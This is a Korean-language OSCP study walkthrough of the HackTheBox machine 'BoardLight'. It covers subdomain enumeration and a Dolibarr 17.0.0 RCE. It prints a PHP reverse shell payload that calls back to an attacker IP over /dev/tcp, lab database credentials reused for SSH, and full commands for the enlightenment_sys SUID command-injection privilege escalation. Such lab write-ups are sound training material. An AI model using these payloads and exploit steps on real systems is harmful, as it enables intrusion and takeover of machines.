---
slug: "boardlight"
title: "_BoardLight"
date: 2026-06-29
category: "linux"
section: "OSCP"
group: "01_boxes"
tags: []
excerpt: "|Port|Service| |---|---| |22|SSH| |80|HTTP|"
readingTime: 5
---

#### Box: BoardLight | Linux | Easy

날짜: 2026.06.26
소요시간: -

---
##### Open Ports

|Port|Service|
|---|---|
|22|SSH|
|80|HTTP|

---
##### Interesting Services

- `contact.php`에 입력창 존재
- 페이지 footer에서 `board.htb` 도메인 발견 → `/etc/hosts` 등록

```shell
echo "10.129.21.46 board.htb" | sudo tee -a /etc/hosts
```

- 서브도메인 탐색

```shell
gobuster vhost -u http://board.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
# 결과: crm.board.htb
```

- 발견된 서브도메인 추가 등록

```shell
echo "10.129.21.46 crm.board.htb" | sudo tee -a /etc/hosts
```

- `crm.board.htb` 접속 시 **Dolibarr 17.0.0** 로그인 페이지 확인
- RCE 취약점 존재: [CVE-2023-30253](https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253)

**리버스 쉘 페이로드**

```php
<?php exec("bash -c 'bash -i >& /dev/tcp/10.10.15.242/5555 0>&1'"); ?>
```

---
##### Initial Foothold

- CVE-2023-30253으로 www-data 쉘 획득
- Dolibarr PHP 파일 업로드 기능을 통해 웹쉘 삽입

---
##### Privilege Escalation (www-data → larissa)

벡터: **DB 크리덴셜 재사용**

```shell
netstat -tnlp
# MySQL 포트(3306) 확인
```

- 설정 파일에서 크리덴셜 발견

```
경로: /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

```php
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
```

- 크리덴셜 재사용으로 SSH 접속 성공

```shell
ssh larissa@10.129.21.46
# PW: serverfun2$2023!!
```

---
##### Privilege Escalation (larissa → root)

벡터: **SUID + Path Traversal + Command Injection (CVE-2022-37706)**

```shell
find / -user root -perm -4000 -ls 2>/dev/null
# enlightenment_sys 발견
```

- CVE 참고: [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh)

**익스플로잇 원리**

`enlightenment_sys`는 mount 실행 전 아래 항목들을 체크함:

1. 경로가 `/dev/`로 시작하는지
2. stat64로 경로 실제 존재 여부
3. 경로 길이 (`!= 6`) 체크

→ 그러나 **따옴표 제거 후 `;` 뒤를 별도 명령으로 실행**하는 것은 막지 못함

**수동 익스플로잇**

```shell
# mount 연결용 디렉토리 (실제로 존재해야 함)
mkdir -p /tmp/net

# 체크 우회용 디렉토리 (경로에 ';' 삽입)
mkdir -p "/dev/../tmp/;/tmp/exploit"

# 실제 실행될 페이로드
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit

# 공격 실행
# enlightenment_sys가 따옴표 제거 후 ';/tmp/exploit'을 root로 실행
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys \
  /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \
  "/dev/../tmp/;/tmp/exploit" /tmp///net
```

→ **Path Traversal + Command Injection + SUID** 조합

---
##### Rabbit Hole (막혔던 것)

- footer에 실제 도메인 있으면 host 파일 등록해서 사용하기
- 서브도메인 스캔 하기
- CVE 재현하기

---
##### 다음 박스에서 써먹을 것

- footer/소스코드에서 도메인명 꼭 확인
- 웹앱 **설정 파일**에서 DB 크리덴셜 → SSH 재사용 패턴
- SUID 바이너리 발견 시 버전 확인 후 CVE 탐색
---
